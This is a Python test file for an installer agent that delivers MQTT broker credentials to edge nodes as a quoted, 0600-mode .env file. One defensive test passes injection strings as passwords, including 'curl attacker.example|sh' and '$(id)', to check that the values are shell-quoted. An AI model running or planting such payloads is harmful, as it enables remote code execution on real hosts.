"""Broker credentials reach an edge node out of band, and never through an argv.

The runner reads ``MQTT_USERNAME``/``MQTT_PASSWORD`` from its own environment
and exposes no flags for them, so a node deployed before broker auth existed
connects anonymously — and turning auth on orphans every one of them, retrying
forever with nothing useful in the log. Delivery is the missing half.

It has to be a file rather than the command line. ``MQTT_PASSWORD=… nohup …``
keeps the value out of the *runner's* argv, but SSH exec runs
``$SHELL -c '<the whole command string>'``, and that wrapper's argv is readable
by any local user with ``ps`` for as long as the launch takes.
"""

from dataclasses import replace
from typing import Any

import pytest

from wactorz.agents import installer_agent
from wactorz.agents.installer_agent import InstallerAgent
from wactorz.config import CONFIG, DeployTarget


class FakeSftp:
    """Records what a deploy writes, standing in for asyncssh's SFTP client."""

    def __init__(self) -> None:
        self.written: dict[str, str] = {}
        self.modes: dict[str, int] = {}

    def open(self, path: str, _mode: str) -> Any:
        written = self.written
        outer = self

        class _Handle:
            async def write(self, body: str) -> None:
                written[path] = body

            async def __aenter__(self) -> "_Handle":
                return self

            async def __aexit__(self, *_exc: object) -> None:
                return None

        assert outer is not None
        return _Handle()

    async def chmod(self, path: str, mode: int) -> None:
        self.modes[path] = mode


def _agent() -> Any:
    agent = InstallerAgent.__new__(InstallerAgent)
    agent.name = "installer"
    return agent


def _target(**over: Any) -> DeployTarget:
    return DeployTarget(name="rpi", host="10.0.0.5", **over)


class TestWhatIsWritten:
    async def test_the_nodes_own_credentials_win(self) -> None:
        sftp = FakeSftp()
        target = _target(broker_user="rpi-account", broker_password="per-node")

        assert await _agent()._put_broker_env(sftp, target, "pi")

        body = sftp.written["/home/pi/wactorz/.env"]
        assert "MQTT_USERNAME=rpi-account" in body
        assert "MQTT_PASSWORD=per-node" in body

    async def test_it_falls_back_to_the_servers_own(self, monkeypatch: pytest.MonkeyPatch) -> None:
        # The usable default: one broker with one account is the common case.
        _server_broker(monkeypatch, "wactorz", "shared")
        sftp = FakeSftp()

        assert await _agent()._put_broker_env(sftp, _target(), "pi")

        assert "MQTT_PASSWORD=shared" in sftp.written["/home/pi/wactorz/.env"]

    async def test_it_is_written_unreadable_to_anyone_else(self) -> None:
        # The node is a Pi in a cupboard; local users are not the threat model
        # this closes, but a 0644 secret is indefensible either way.
        sftp = FakeSftp()

        await _agent()._put_broker_env(sftp, _target(broker_password="p"), "pi")

        assert sftp.modes["/home/pi/wactorz/.env"] == 0o600

    async def test_an_anonymous_broker_writes_nothing(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # Otherwise a working anonymous setup gains a runner that exports two
        # empty variables, which is a connection failure rather than a no-op.
        _server_broker(monkeypatch, "", "")
        sftp = FakeSftp()

        assert not await _agent()._put_broker_env(sftp, _target(), "pi")
        assert not sftp.written

    @pytest.mark.parametrize(
        "hostile",
        ["p; curl attacker.example|sh", "p$(id)", "p`id`", "p with spaces", 'p"quote'],
    )
    async def test_a_hostile_value_survives_being_sourced(self, hostile: str) -> None:
        # The file is `. `-sourced by a shell, so an unquoted value would be
        # shell syntax on the node — the injection the launch line was fixed for,
        # moved into a file.
        import shlex

        sftp = FakeSftp()

        await _agent()._put_broker_env(sftp, _target(broker_password=hostile), "pi")

        line = next(
            ln
            for ln in sftp.written["/home/pi/wactorz/.env"].splitlines()
            if ln.startswith("MQTT_PASSWORD=")
        )
        assert shlex.split(line) == [f"MQTT_PASSWORD={hostile}"]


def _server_broker(monkeypatch: pytest.MonkeyPatch, user: str, password: str) -> None:
    """Point the agent's CONFIG at these broker credentials.

    `replace` rather than setattr: AppConfig is frozen, so the module binding is
    what a test can move.
    """
    monkeypatch.setattr(
        installer_agent,
        "CONFIG",
        replace(CONFIG, mqtt_username=user, mqtt_password=password),
    )
